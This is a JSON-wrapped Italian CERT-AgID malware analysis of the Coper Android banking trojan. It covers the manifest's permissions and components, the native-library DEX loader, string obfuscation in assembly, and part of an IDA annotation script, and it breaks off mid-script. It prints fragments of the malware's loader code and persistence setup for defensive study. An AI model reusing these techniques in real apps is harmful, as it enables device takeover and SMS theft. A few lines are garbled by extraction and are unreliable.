{
    "id": "bc229d73-14a7-4a9a-8b66-281af1b8ab2b",
    "created_at": "2023-01-12T15:08:18.757144Z",
    "updated_at": "2025-03-27T02:05:21.950217Z",
    "deleted_at": null,
    "sha1_hash": "263b8046a0629442045dd6d41e666c4ff6bed604",
    "title": "2022-07-19 - Analysis and technical insights on the Coper malware used to attack mobile devices",
    "authors": "",
    "file_creation_date": "2022-08-18T03:25:34Z",
    "file_modification_date": "2022-08-18T03:25:34Z",
    "file_size": 1748454,
    "plain_text": "# Analisi e approfondimenti tecnici sul malware Coper utilizzato per attaccare dispositivi mobili\n\n**[cert-agid.gov.it/news/analisi-e-approfondimenti-tecnici-sul-malware-coper-utilizzato-per-attaccare-dispositivi-mobili/](https://cert-agid.gov.it/news/analisi-e-approfondimenti-tecnici-sul-malware-coper-utilizzato-per-attaccare-dispositivi-mobili/)**\n\n#### 19/07/2022\n\n coper Questo articolo è un approfondimento tecnico effettuato sul campione individuato dal CERT-AgID nel mese di Maggio 2022 che aiuta a svelare la natura del malware Coper, utilizzato di recente da campagne malware che prendevano di mira dispositivi mobili, e che fornisce interessanti spunti di riflessione sulle tecniche utilizzate dai suoi sviluppatori per proteggere il sample, per comunicare con il C2 e gestirne le risposte, per garantirsi la persistenza sul dispositivo una volta compromesso e su come impedisce agli analisti di fare attribuzione basata sui paesi immuni.\n\n## Il Manifest\n\n#### Come per tutte le applicazioni Android anche per Coper l’analisi inizia dal Manifest.\n```\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:versionCode=\"5\"\nandroid:versionName=\"5.5\" android:compileSdkVersion=\"28\" android:compileSdkVersionCodename=\"9\" package=\"com.leadendq\"\nplatformBuildVersionCode=\"28\" platformBuildVersionName=\"9\">\n<uses-sdk android:minSdkVersion=\"21\"\nandroid:targetSdkVersion=\"28\"/>\n<uses-permission android:name=\"android.permission.INSTALL_SHORTCUT\"/>\n<usespermission android:name=\"android.permission.ADD_VOICEMAIL\"/>\n<uses-permission\nandroid:name=\"android.permission.CLEAR_APP_CACHE\"/>\n<uses-permission\nandroid:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>\n<uses-permission\nandroid:name=\"android.permission.ACCESS_NOTIFICATION_POLICY\"/>\n<uses-permission\nandroid:name=\"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS\"/>\n<uses-permission\nandroid:name=\"android.permission.FOREGROUND_SERVICE\"/>\n<uses-permission\nandroid:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>\n<uses-permission\nandroid:name=\"android.permission.INTERNET\"/>\n<uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n<usespermission android:name=\"android.permission.READ_SMS\"/>\n<uses-permission\nandroid:name=\"android.Manifest.permission.READ_PHONE_STATE\"/>\n<uses-permission\nandroid:name=\"android.permission.SEND_SMS\"/>\n<uses-permission android:name=\"android.permission.WAKE_LOCK\"/>\n<usespermission android:name=\"android.permission.READ_PHONE_STATE\"/>\n<uses-permission\nandroid:name=\"android.permission.CALL_PHONE\"/>\n<uses-permission\nandroid:name=\"android.permission.USES_POLICY_FORCE_LOCK\"/>\n<uses-permission\nandroid:name=\"android.permission.VIBRATE\"/>\n<uses-permission\nandroid:name=\"android.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND\"/>\n<uses-permission\nandroid:name=\"android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND\"/>\n<uses-permission\nandroid:name=\"android.permission.REQUEST_DELETE_PACKAGES\"/>\n<uses-permission\nandroid:name=\"android.permission.MODIFY_AUDIO_SETTINGS\"/>\n<uses-permission\nandroid:name=\"android.permission.ACCESS_WIFI_STATE\"/>\n<uses-permission\nandroid:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\n<uses-permission\nandroid:name=\"android.permission.WRITE_SETTINGS\"/>\n<uses-permission android:name=\"android.permission.REORDER_TASKS\"/>\n<application android:theme=\"@style/Theme_AppCompat_Transparent_NoActionBar\" android:label=\"@string/a\"\nandroid:icon=\"@drawable/ic_launcher\" android:name=\"com.leadendq.LBXlHKkaN\" android:allowBackup=\"false\"\nandroid:usesCleartextTraffic=\"true\" android:appComponentFactory=\"android.support.v4.app.CoreComponentFactory\">\n<useslibrary android:name=\"org.apache.http.legacy\" android:required=\"false\"/>\n<activity android:label=\"@string/a\"\nandroid:name=\"com.leadendq.p022e\" android:exported=\"true\" android:screenOrientation=\"fullSensor\"\nandroid:noHistory=\"false\">\n<intent-filter>\n<category android:name=\"android.intent.category.LAUNCHER\"/>\n<action\nandroid:name=\"android.intent.action.MAIN\"/>\n</intent-filter>\n</activity>\n<activity\nandroid:theme=\"@style/Theme_AppCompat_Transparent_NoActionBar\" android:name=\"com.leadendq.p025p\"\nandroid:exported=\"false\" android:excludeFromRecents=\"true\" android:noHistory=\"true\"/>\n<activity\nandroid:theme=\"@style/Theme_AppCompat_Transparent_NoActionBar\" android:name=\"com.leadendq.p061p\"\nandroid:exported=\"false\" android:excludeFromRecents=\"true\" android:noHistory=\"true\"/>\n<activity\nandroid:theme=\"@style/Theme_AppCompat_Transparent_NoActionBar\" android:name=\"com.leadendq.p094v\"\nandroid:exported=\"false\" android:excludeFromRecents=\"true\"/>\n<activity android:name=\"com.leadendq.p057h\"\nandroid:exported=\"false\" android:excludeFromRecents=\"true\" android:launchMode=\"singleTask\"/>\n<activity\nandroid:theme=\"@android:style/Theme.Dialog\" android:name=\"com.leadendq.p016q\" android:exported=\"false\"\nandroid:excludeFromRecents=\"true\"/>\n<activity android:theme=\"@android:style/Theme.NoTitleBar.Fullscreen\"\nandroid:label=\"\" android:icon=\"@drawable/icon\" android:name=\"com.leadendq.p097d\" android:exported=\"false\"\nandroid:excludeFromRecents=\"true\" android:launchMode=\"singleTask\" android:screenOrientation=\"fullSensor\"\nandroid:windowSoftInputMode=\"adjustResize\"/>\n<activity android:theme=\"@android:style/Theme.NoTitleBar.Fullscreen\"\nandroid:name=\"com.leadendq.p080g\" android:exported=\"false\" android:excludeFromRecents=\"true\"\nandroid:launchMode=\"singleTask\" android:screenOrientation=\"fullSensor\" android:windowSoftInputMode=\"adjustResize\"/>\n<receiver android:label=\"@string/a\" android:name=\"com.leadendq.p086c\"\nandroid:permission=\"android.permission.BIND_DEVICE_ADMIN\" android:exported=\"false\">\n<meta-data\n\n```\n\n-----\n\n```\n              pp j\nandroid:name=\"android.app.action.DEVICE_ADMIN_ENABLED\"/>\n<action\nandroid:name=\"android.app.action.DEVICE_ADMIN_DISABLED\"/>\n</intent-filter>\n</receiver>\n<receiver\nandroid:name=\"com.leadendq.p064y\" android:exported=\"true\">\n<intent-filter android:priority=\"999\">\n<action\nandroid:name=\"android.provider.Telephony.SMS_RECEIVED\"/>\n</intent-filter>\n</receiver>\n<receiver\nandroid:name=\"com.leadendq.p058q\" android:permission=\"android.permission.BROADCAST_SMS\" android:exported=\"true\">\n<intent-filter>\n<action android:name=\"android.provider.Telephony.SMS_DELIVER\"/>\n</intent-filter>\n</receiver>\n<receiver android:name=\"com.leadendq.p032o\" android:permission=\"android.permission.BROADCAST_WAP_PUSH\"\nandroid:exported=\"true\">\n<intent-filter>\n<action android:name=\"android.provider.Telephony.WAP_PUSH_DELIVER\"/>\n<data\nandroid:mimeType=\"application/vnd.wap.mms-message\"/>\n</intent-filter>\n</receiver>\n<activity\nandroid:name=\"com.leadendq.p036z\" android:exported=\"false\">\n<intent-filter>\n<action\nandroid:name=\"android.intent.action.SEND\"/>\n<action android:name=\"android.intent.action.SENDTO\"/>\n<category\nandroid:name=\"android.intent.category.DEFAULT\"/>\n<category android:name=\"android.intent.category.BROWSABLE\"/>\n<data\nandroid:scheme=\"sms\"/>\n<data android:scheme=\"smsto\"/>\n<data android:scheme=\"mms\"/>\n<data android:scheme=\"mmsto\"/>\n</intent-filter>\n</activity>\n<service android:name=\"com.leadendq.p028m\"\nandroid:permission=\"android.permission.SEND_RESPOND_VIA_MESSAGE\" android:exported=\"true\">\n<intent-filter>\n<action\nandroid:name=\"android.intent.action.RESPOND_VIA_MESSAGE\"/>\n<category android:name=\"android.intent.category.DEFAULT\"/>\n<data android:scheme=\"sms\"/>\n<data android:scheme=\"smsto\"/>\n<data android:scheme=\"mms\"/>\n<data\nandroid:scheme=\"mmsto\"/>\n</intent-filter>\n</service>\n<receiver android:name=\"com.leadendq.p015a\"\nandroid:enabled=\"true\" android:exported=\"false\"/>\n<receiver android:name=\"com.leadendq.p041o\" android:enabled=\"true\"\nandroid:exported=\"true\">\n<intent-filter android:priority=\"999\">\n<action\nandroid:name=\"android.intent.action.BOOT_COMPLETED\"/>\n<action\nandroid:name=\"android.intent.action.QUICKBOOT_POWERON\"/>\n<action android:name=\"android.intent.action.USER_PRESENT\"/>\n<action android:name=\"android.intent.action.PACKAGE_ADDED\"/>\n<action\nandroid:name=\"android.intent.action.PACKAGE_REMOVED\"/>\n<action\nandroid:name=\"android.provider.Telephony.SMS_RECEIVED\"/>\n<action android:name=\"android.intent.action.SCREEN_ON\"/>\n<action android:name=\"android.intent.action.SCREEN_OFF\"/>\n<action\nandroid:name=\"android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE\"/>\n<category\nandroid:name=\"android.intent.category.HOME\"/>\n<action android:name=\"android.net.conn.CONNECTIVITY_CHANGE\"/>\n<action\nandroid:name=\"android.net.wifi.WIFI_STATE_CHANGED\"/>\n<action android:name=\"android.intent.action.DREAMING_STOPPED\"/>\n</intent-filter>\n</receiver>\n<service android:name=\"com.leadendq.p038x\" android:exported=\"false\"/>\n<service\nandroid:name=\"com.leadendq.p095g\" android:exported=\"false\"/>\n<service android:name=\"com.leadendq.LogSrv\"\nandroid:exported=\"false\"/>\n<service android:name=\"com.leadendq.p027j\" android:exported=\"false\"/>\n<service\nandroid:name=\"com.leadendq.p084n\" android:exported=\"false\"/>\n<service android:name=\"com.leadendq.p020e\"\nandroid:exported=\"false\"/>\n<service android:label=\"@string/a\" android:name=\"com.leadendq.p081h\"\nandroid:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\" android:enabled=\"true\" android:exported=\"false\">\n<intent-filter>\n<action android:name=\"android.accessibilityservice.AccessibilityService\"/>\n</intent-filter>\n<metadata android:name=\"android.accessibilityservice\" android:resource=\"@xml/qfdfvpqvhifumvn\"/>\n</service>\n<service\nandroid:name=\"com.leadendq.p025n\" android:permission=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\"\nandroid:exported=\"false\">\n<intent-filter>\n<action\nandroid:name=\"android.service.notification.NotificationListenerService\"/>\n</intent-filter>\n</service>\n<receiver\nandroid:name=\"com.leadendq.p061e\"/>\n<receiver android:name=\"com.leadendq.p043c\"/>\n<receiver\nandroid:name=\"com.leadendq.p049d\"/>\n<activity android:name=\"com.leadendq.p077n\"/>\n<activity\nandroid:name=\"com.leadendq.p058z\"/>\n<activity android:name=\"com.leadendq.p059z\"/>\n<service\nandroid:name=\"com.leadendq.p012q\"/>\n<service android:name=\"com.leadendq.p055u\"/>\n<service\nandroid:name=\"com.leadendq.p092f\"/>\n<activity android:name=\"com.leadendq.yfmwduzqgrqjb\"/>\n<activity\nandroid:name=\"com.leadendq.jvnbrlasqse\"/>\n<activity android:name=\"com.leadendq.lnpmgoqtyz\"/>\n<activity\nandroid:name=\"com.leadendq.xuakpiffgk\"/>\n<activity android:name=\"com.leadendq.ywzsyumnkjkluk\"/>\n<receiver\nandroid:name=\"com.leadendq.ctiepwdczo\"/>\n<receiver android:name=\"com.leadendq.fjzxhdqzejzl\"/>\n<receiver\nandroid:name=\"com.leadendq.ihszxrwantyhd\"/>\n<receiver android:name=\"com.leadendq.ajqxphhhegvm\"/>\n<receiver\nandroid:name=\"com.leadendq.gudqrgxxquzul\"/>\n<receiver android:name=\"com.leadendq.svhpujstqnsisu\"/>\n<receiver\nandroid:name=\"com.leadendq.duqokmecolw\"/>\n<service android:name=\"com.leadendq.etmjpgolkqnubo\"/>\n<service\nandroid:name=\"com.leadendq.simjjltntxmolo\"/>\n<service android:name=\"com.leadendq.ulxbedwqpc\"/>\n<service\nandroid:name=\"com.leadendq.thonuiqzjraes\"/>\n<service android:name=\"com.leadendq.ylxnbgoahg\"/>\n</application>\n</manifest>\n\n#### Il Manifest contiene la lista dei componenti di un’applicazione e permette di delineare una panoramica delle funzionalità senza entrare subito nei dettagli del codice.\n\n Di seguito illustriamo un sunto incentrato su i due aspetti che più sono utili per farsi un’idea delle funzionalità del malware: i permessi ed i componenti dell’App.\n\n## I permessi\n\n#### Per funzionare, il malware richiede almeno Android 5.0, un requisito che è soddisfatto da più del 97% dei dispositivi Android alla data attuale (19/07/2022), e 26 permessi divisi nelle seguenti categorie:\n\n Gestione delle altre app (CLEAR_APP_CACHE, REQUEST_DELETE_PACKAGES, REORDER_TASKS) Esecuzione in background (FOREGROUND_SERVICE, RECEIVE_BOOT_COMPLETED)[1]\n\n```\n\n-----\n\n#### Gest o e S S e te e o a ( C _S S, _S S, _ O _S, S _S S, _ O _S, CALL_PHONE, ADD_VOICEMAIL) Creazione di notifiche (ACCESS_NOTIFICATION_POLICY, VIBRATE) Gestione del risparmio batteria in background (WAKE_LOCK, REQUEST_COMPANION_RUN_IN_BACKGROUND, REQUEST_COMPANION_USE_DATA_IN_BACKGROUND, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS) Blocco software del dispositivo (MODIFY_AUDIO_SETTINGS, USES_POLICY_FORCE_LOCK) Connettività (INTERNET, ACCESS_WIFI_STATE, ACCESS_NETWORK_STATE) Modifiche ed accesso al sistema (INSTALL_SHORTCUT, WRITE_SETTINGS, READ_EXTERNAL_STORAGE)\n\n Un servizio in foreground è comunque un servizio eseguito indipendentemente dall’activity attualmente attiva.\n\n Il profilo che si delinea è quello del classico malware per Android che garantisce l’accesso al dispositivo tramite servizi in background, raccoglie informazioni riguardanti le applicazioni installate (con il fine di presentare gli Inject appropriati), legge e redirige SMS e chiamate per ottenere i codice 2FA e blocco software del dispositivo (l’audio viene disattivato e lo schermo bloccato in continuazione, impedendo l’utilizzo del dispositivo).\n\n## I componenti\n\n#### I permessi utilizzati, da soli, non sono sufficienti per determinare le caratteristiche di un malware per Android. Infatti, al di là del codice effettivamente presente nell’applicazione malevola, componenti come servizi e broadcast receiver richiedono a loro volta permessi appositi per poter essere lanciati e tali permessi sono ottenuti a runtime (ad esempio la necessità di avere il permesso BIND_ACCESSIBILITY_SERVICE per poter avviare un servizio di accessibilità).\n\n Analizzeremo i vari componenti di seguito limitandoci qui a questa breve panoramica:\n\n Applicazione. Nel manifest è indicata un’apposita classe come tipo dell’oggetto applicazione. Questo permette di eseguire codice durante il ciclo di vita dell’applicazione stessa (anzichè dei singoli componenti) ed è una tecnica ben nota ed usata per il caricamento a runtime di classi aggiuntive contenute in file DEX esterni. Vedremo sotto il dettaglio. Activity principale. Comporta la visualizzazione di un’icona nel launcher. Receiver per Device Admin. Intent Receiver per dare funzionalità di amministratore all’applicazione. Vari Receiver e Activity per la lettura e l’invio degli SMS, MMS e notifiche WAP e per rispondere alle chiamate in ingresso con un SMS (un modo per silenziare quest’ultime). Un Receiver che fa da raccoglitore di eventi del sistema (avvio, connettività, installazione e rimozione applicazioni, presenza dell’utente, stato dello schermo). Un servizio di accessibilità che dà il controllo completo del dispositivo al malware. Circa una quarantina tra Receiver e Activity generiche (stando a quanto contenuto nel manifest).\n\n## DEX a runtime\n\n#### La presenza di una classe specifica per intercettare gli eventi del ciclo di vita dell’applicazione fa pensare al classico meccanismo di caricamento di DEX aggiuntivi a runtime. Infatti le classi effettivamente presenti nel DEX nell’APK corrispondono a servizi ed activity che non fanno niente. A titolo di esempio si riporta il codice di due di questi componenti:\n```\npublic class ylxnbgoahg extends Service {\n@Override // android.app.Service\npublic IBinder onBind(Intent intent) {\nreturn null;\n}\n@Override // android.app.Service\npublic int onStartCommand(Intent intent, int i, int i2) {\nreturn 2;\n}\n}\npublic class ywzsyumnkjkluk extends Activity {\n/* access modifiers changed from: protected */\n@Override //\nandroid.app.Activity\npublic void onCreate(Bundle bundle) {\nsuper.onCreate(bundle);\n}\n}\n\n Ci sono solo tre classi utili all’interno dell’APK:\n\n```\n\n-----\n\n#### 1. BuildConfig contiene la versione dell’applicazione che in questo sample è impostata a 5.5. 2. C0265R è la classe delle risorse (Il cui nome è R quando non offuscata). 3. LBXlHKkaN è la classe dell’applicazione, dove già è visibile che il metodo attachBaseContext è stato “overridato”.\n\n### Altri componenti e JNI\n\n#### Risulta ormai chiaro che i componenti presenti nel manifest ma mancanti nell’APK sono caricati a runtime in attachBaseContext. il metodo che contiene il codice della classe è il seguente::\n```\npublic class LBXlHKkaN extends Application {\npublic native void jpXOrO(Object obj);\n/* access modifiers changed\nfrom: protected */\n@Override // android.content.ContextWrapper\npublic void attachBaseContext(Context context) {\nsuper.attachBaseContext(context);\ntry {\nMethod declaredMethod = LBXlHKkaN.class.getDeclaredMethod(\"jpXOrO\",\nObject.class);\ndeclaredMethod.setAccessible(true);\ndeclaredMethod.invoke(this, context);\n} catch (Exception e) {\ne.printStackTrace();\n}\n}\nstatic {\nSystem.loadLibrary(\"uXTAbVUl\");\n}\n}\n\n Il compito di questa classe è quello di caricare la libreria uXTAbVUl ed eseguire il proprio metodo jpXOrO: quest’ultimo è un metodo nativo e quindi implementato dalla libreria appena caricata.\n\n E’ interessante notare che questa scelta di utilizzare una libreria nativa può limitare le architetture su cui il malware può eseguirsi. Le architetture supportate sono mostrate in figura:\n\n Il malware supporta quindi x86 (32 e 64 bit) ed ARM (32 e 64 bit, nello specifico v7a e v8a), quindi la virtuale totalità dei dispositivi Android.\n\n Per ottenere il file DEX con gli altri componenti è necessario analizzare il codice nativo. Si è scelto quindi di analizzare la versione x86_64 in modo da usare una versione gratuita di IDA per Linux.\n\n Quando alla JVM è richiesto di risolvere il nome di un metodo nativo Class::method, essa cerca nelle librerie caricate un metodo di nome Java_<mangled_full_class_name>_<mangled_method_name>. Le specifiche (tra cui il mangling) sono definite qui ed includono la possibilità di avere metodi nativi overloadati. Ci si aspetta quindi di trovare nella libreria un simbolo pubblico di nome\n\n```\n\n-----\n\n#### Ja a_co _ eade dq_ a _jp O O att questo è u co etodo espo tato a a J qua to è u co c e a pe Ja a_\n\n Un rapido sguardo ai simboli e al codice presenti nella libreria ci informa che è stata scritta in C++: i nomi seguono infatti il mangling C++ (che è ripreso dall’ABI dell’architettura Itanium anche per le altre architetture). L’esempio sotto è chiarificatore:\n```\nmov rbx, rbp\nmov r12, r13\nmov rbp, r14\nmov rax, [r14]\nlea rsi, [rsp+508h+var_272]\nmov rdi, r14\ncall qword ptr\n[rax+538h]\nmov rdi, r14\nmov rsi, r15\nmov rdx, rbx\nmov r13, rbx\nmov rcx, rax\nxor eax, eax\ncall\n__ZN7_JNIEnv16CallObjectMethodEP8_jobjectP10_jmethodIDz ; _JNIEnv::CallObjectMethod(_jobject *,_jmethodID *,...)\nmov\nrbx, rax\nmov rax, [r14]\nmov rdi, r14\nmov rsi, rbx\ncall qword ptr [rax+0F8h]\n\n Notiamo anche che le stringhe sono generate tramite chiamate a strcpy e strcat (tecnicamente alle loro versioni safe esposte da bionic, l’implementazione di libc di Android). Infatti Java_com_leadendq_LBXlHKkaN_jpXOrO contiene un enorme prologo in cui sono generate le stringhe usate, concatenando un carattere alla volta.\npush rbp\npush r15\npush r14\npush r13\npush r12\npush rbx\nsub rsp, 4D8h\nmov [rsp+508h+var_500], rdx\nmov\n[rsp+508h+var_4D8], rdi\nmov rax, fs:28h\nmov [rsp+508h+var_38], rax\nlea rsi, aE_0 ; \"E\"\nlea rbp, [rsp+508h+var_68]\nmov\nedx, 21h ; '!'\nmov ecx, 21h ; '!'\nmov r8d, 2\nmov rdi, rbp\ncall ___strncpy_chk2\nlea rsi, asc_1339 ; \"F\"\nmov edx, 21h ;\n'!'\nmov ecx, 21h ; '!'\nmov rdi, rbp\ncall ___strncat_chk\nlea r12, aA ; \"A\"\nmov edx, 21h ; '!'\nmov ecx, 21h ; '!'\nmov\nrdi, rbp\nmov rsi, r12\ncall ___strncat_chk\nlea r14, aXzkns ; \"XZkNs\"\nmov edx, 21h ; '!'\nmov ecx, 21h ; '!'\nmov rdi,\nrbp\nmov rsi, r14\ncall ___strncat_chk\n\n Quello che si osserva è probabilmente il risultato di un’offuscazione ottenibile tramite meta-programmazione (ovvero tramite template).\n\n Ci sono due inconvenienti per l’analisi del codice di questa libreria:\n\n 1. Le chiamate all’oggetto JNIEnv che per loro natura appaiono come chiamate indirette della forma call [base + displacemente]. 2. L’offuscazione delle stringhe che amplifica il codice di una funzione ed è difficile da seguire manualmente.\n\n Ogni funzione JNI riceve come primo parametro un puntatore ad oggetto JNIEnv: questo rappresenta l’ambiente della JVM e fa da collante tra il mondo nativo e quello Java. In particolare permette di chiamare metodi di oggetti, di creare stringhe, array e così via.\n\n JNIEnv è definito come un puntatore ad una struttura JNINativeInterface (la quale è a sua volta un array di puntatori alle varie funzioni esposte). Questo layout (che ha una rappresentazione grafica qui) è in realtà identico a quello degli oggetti C++ (sempre sotto ABI itanium che fa da standard di riferimento) e COM che in realtà si tratta di una classica vtable.\n\n Dato che la vtable è documentata, è possibile utilizzare uno script per annotare accanto ad ogni call la funzione chiamata. Alternativamente sarebbe possibile descrivere la struttura in IDA e lasciare che sia questa a risolvere le chiamate. È stato scelto di utilizzare iced-x86 per analizzare il codice macchina e generare lo script IDC!\n\n## Estrarre il DEX\n\n#### Lo script mostrato sotto genera lo script IDC per annotare le chiamate JNIEnv e per ricostruire le stringhe.\nfrom iced_x86 import *\nfrom pwn import *\n#Globals and data\nformatter = Formatter(FormatterSyntax.NASM)\ninfo_factory\n= InstructionInfoFactory()\nENV_VTABLE = [\n\"NULL\",\n\"NULL\",\n\"NULL\",\n\"NULL\",\n\"GetVersion\",\n\"DefineClass\",\n\"FindClass\",\n\"FromReflectedMethod\",\n\"FromReflectedField\",\n\"ToReflectedMethod\",\n\"GetSuperclass\",\n\"IsAssignableFrom\",\n\"ToReflectedField\",\n\"Throw\",\n\"ThrowNew\",\n\"ExceptionOccurred\",\n\"ExceptionDescribe\",\n\"ExceptionClear\",\n\"FatalError\",\n\"PushLocalFrame\",\n\"PopLocalFrame\",\n\"NewGlobalRef\",\n\"DeleteGlobalRef\",\n\"DeleteLocalRef\",\n\"IsSameObject\",\n\"NewLocalRef\",\n\"EnsureLocalCapacity\",\n\"AllocObject\",\n\"NewObject\",\n\"NewObjectV\",\n\"NewObjectA\",\n\"GetObjectClass\",\n\"IsInstanceOf\",\n\"GetMethodID\",\n\"CallObjectMethod\",\n\"CallObjectMethodV\",\n\"CallObjectMethodA\",\n\"CallBooleanMethod\",\n\"CallBooleanMethodV\",\n\"CallBooleanMethodA\",\n\"CallByteMethod\",\n\"CallByteMethodV\",\n\"CallByteMethodA\",\n\"CallCharMethod\",\n\"CallCharMethodV\",\n\"CallCharMethodA\",\n\"CallShortMethod\",\n\"CallShortMethodV\",\n\"CallShortMethodA\",\n\"CallIntMethod\",\n\"CallIntMethodV\",\n\"CallIntMethodA\",\n\"CallLongMethod\",\n\"CallLongMethodV\",\n\"CallLongMethodA\",\n\"CallFloatMethod\",\n\"CallFloatMethodV\",\n\"CallFloatMethodA\",\n\"CallDoubleMethod\",\n\"CallDoubleMethodV\",\n\"CallDoubleMethodA\",\n\"CallVoidMethod\",\n\"CallVoidMethodV\",\n\"CallVoidMethodA\",\n\"CallNonvirtualObjectMethod\",\n\"CallNonvirtualObjectMethodV\",\n\"CallNonvirtualObjectMethodA\",\n\"CallNonvirtualBooleanMethod\",\n\"CallNonvirtualBooleanMethodV\",\n\"CallNonvirtualBooleanMethodA\",\n\"CallNonvirtualByteMethod\",\n\"CallNonvirtualByteMethodV\",\n\"CallNonvirtualByteMethodA\",\n\"CallNonvirtualCharMethod\",\n\"CallNonvirtualCharMethodV\",\n\"CallNonvirtualCharMethodA\",\n\"CallNonvirtualShortMethod\",\n\"CallNonvirtualShortMethodV\",\n\"CallNonvirtualShortMethodA\",\n\"CallNonvirtualIntMethod\",\n\"CallNonvirtualIntMethodV\",\n\"CallNonvirtualIntMethodA\",\n\"CallNonvirtualLongMethod\",\n\"CallNonvirtualLongMethodV\",\n\"CallNonvirtualLongMethodA\",\n\"CallNonvirtualFloatMethod\",\n\"CallNonvirtualFloatMethodV\",\n\"CallNonvirtualFloatMethodA\",\n\"CallNonvirtualDoubleMethod\",\n\"CallNonvirtualDoubleMethodV\",\n\"CallNonvirtualDoubleMethodA\",\n\"CallNonvirtualVoidMethod\",\n\"CallNonvirtualVoidMethodV\",\n\"CallNonvirtualVoidMethodA\",\n\"GetFieldID\",\n\"GetObjectField\",\n\"GetBooleanField\",\n\"GetByteField\",\n\"GetCharField\",\n\"GetShortField\",\n\"GetIntField\",\n\"GetLongField\",\n\"GetFloatField\",\n\"GetDoubleField\",\n\"SetObjectField\",\n\"SetBooleanField\",\n\"SetByteField\",\n\"SetCharField\",\n\"SetShortField\",\n\"SetIntField\",\n\"SetLongField\",\n\"SetFloatField\",\n\"SetDoubleField\",\n\"GetStaticMethodID\",\n\"CallStaticObjectMethod\",\n\"CallStaticObjectMethodV\",\n\"CallStaticObjectMethodA\",\n\"CallStaticBooleanMethod\",\n\"CallStaticBooleanMethodV\",\n\"CallStaticBooleanMethodA\",\n\"CallStaticByteMethod\",\n\"CallStaticByteMethodV\",\n\"CallStaticByteMethodA\",\n\"CallStaticCharMethod\",\n\"CallStaticCharMethodV\",\n\"CallStaticCharMethodA\",\n\"CallStaticShortMethod\",\n\"CallStaticShortMethodV\", \"CallStaticShortMethodA\", \"CallStaticIntMethod\", \"CallStaticIntMethodV\",\n\n```\n\n-----\n\n```\n            , g, g, g,\n\"CallStaticFloatMethod\",\n\"CallStaticFloatMethodV\",\n\"CallStaticFloatMethodA\",\n\"CallStaticDoubleMethod\",\n\"CallStaticDoubleMethodV\",\n\"CallStaticDoubleMethodA\",\n\"CallStaticVoidMethod\",\n\"CallStaticVoidMethodV\",\n\"CallStaticVoidMethodA\",\n\"GetStaticFieldID\",\n\"GetStaticObjectField\",\n\"GetStaticBooleanField\",\n\"GetStaticByteField\",\n\"GetStaticCharField\",\n\"GetStaticShortField\",\n\"GetStaticIntField\",\n\"GetStaticLongField\",\n\"GetStaticFloatField\",\n\"GetStaticDoubleField\",\n\"SetStaticObjectField\",\n\"SetStaticBooleanField\",\n\"SetStaticByteField\",\n\"SetStaticCharField\",\n\"SetStaticShortField\",\n\"SetStaticIntField\",\n\"SetStaticLongField\",\n\"SetStaticFloatField\",\n\"SetStaticDoubleField\",\n\"NewString\",\n\"GetStringLength\",\n\"GetStringChars\",\n\"ReleaseStringChars\",\n\"NewStringUTF\",\n\"GetStringUTFLength\",\n\"GetStringUTFChars\",\n\"ReleaseStringUTFChars\",\n\"GetArrayLength\",\n\"NewObjectArray\",\n\"GetObjectArrayElement\",\n\"SetObjectArrayElement\",\n\"NewBooleanArray\",\n\"NewByteArray\",\n\"NewCharArray\",\n\"NewShortArray\",\n\"NewIntArray\",\n\"NewLongArray\",\n\"NewFloatArray\",\n\"NewDoubleArray\",\n\"GetBooleanArrayElements\",\n\"GetByteArrayElements\",\n\"GetCharArrayElements\",\n\"GetShortArrayElements\",\n\"GetIntArrayElements\",\n\"GetLongArrayElements\",\n\"GetFloatArrayElements\",\n\"GetDoubleArrayElements\",\n\"ReleaseBooleanArrayElements\",\n\"ReleaseByteArrayElements\",\n\"ReleaseCharArrayElements\",\n\"ReleaseShortArrayElements\",\n\"ReleaseIntArrayElements\",\n\"ReleaseLongArrayElements\",\n\"ReleaseFloatArrayElements\",\n\"ReleaseDoubleArrayElements\",\n\"GetBooleanArrayRegion\",\n\"GetByteArrayRegion\",\n\"GetCharArrayRegion\",\n\"GetShortArrayRegion\",\n\"GetIntArrayRegion\",\n\"GetLongArrayRegion\",\n\"GetFloatArrayRegion\",\n\"GetDoubleArrayRegion\",\n\"SetBooleanArrayRegion\",\n\"SetByteArrayRegion\",\n\"SetCharArrayRegion\",\n\"SetShortArrayRegion\",\n\"SetIntArrayRegion\",\n\"SetLongArrayRegion\",\n\"SetFloatArrayRegion\",\n\"SetDoubleArrayRegion\",\n\"RegisterNatives\",\n\"UnregisterNatives\",\n\"MonitorEnter\",\n\"MonitorExit\",\n\"GetJavaVM\",\n\"GetStringRegion\",\n\"GetStringUTFRegion\",\n\"GetPrimitiveArrayCritical\",\n\"ReleasePrimitiveArrayCritical\",\n\"GetStringCritical\",\n\"ReleaseStringCritical\",\n\"NewWeakGlobalRef\",\n\"DeleteWeakGlobalRef\",\n\"ExceptionCheck\",\n\"NewDirectByteBuffer\",\n\"GetDirectBufferAddress\",\n\"GetDirectBufferCapacity\",\n\"GetObjectRefType\",\n]\n\"\"\"\nMake a basic block of a CFG.\nA block is a dict with the\nfollowing keys:\nstart - the VA where the block start\nend - the first VA NOT belonging to the block (i.e. the VA just\nafter the last instruction of the block)\ncode - the instructions of the block. This is a dict, the keys are the VA\nand the values are iced-x86 instruction objects\nfollow - the block the follow (thtough) this one. This can be None if\nthis block ends with a ret for example.\nbranch - the block that is the target of a conditional jump.\n\"\"\"\ndef\nmake_block(elf, va, blocks_done=None):\n#blocks_done must be a list but we cannot set the default value to [] due to\nhow Python parsing works\nif blocks_done is None:\nblocks_done = []\n#Make an empty block starting and ending at va\ndef\nnew_block(va):\nb = {\n\"start\": va,\n\"end\": va,\n\"code\": {},\n\"follow\": None,\n\"branch\": None\n}\n#Append the new block in\nthe done list so we won't recurse forever\nblocks_done.append(b)\nreturn b #Checks if va belong to a block already\nprocessed.\n#This avoids infinite recutions on loops.\n#Furthermore if va is in the middle of a block, that block is\nsplit\ndef check_done_and_split(va, split = True):\nfor b in blocks_done: 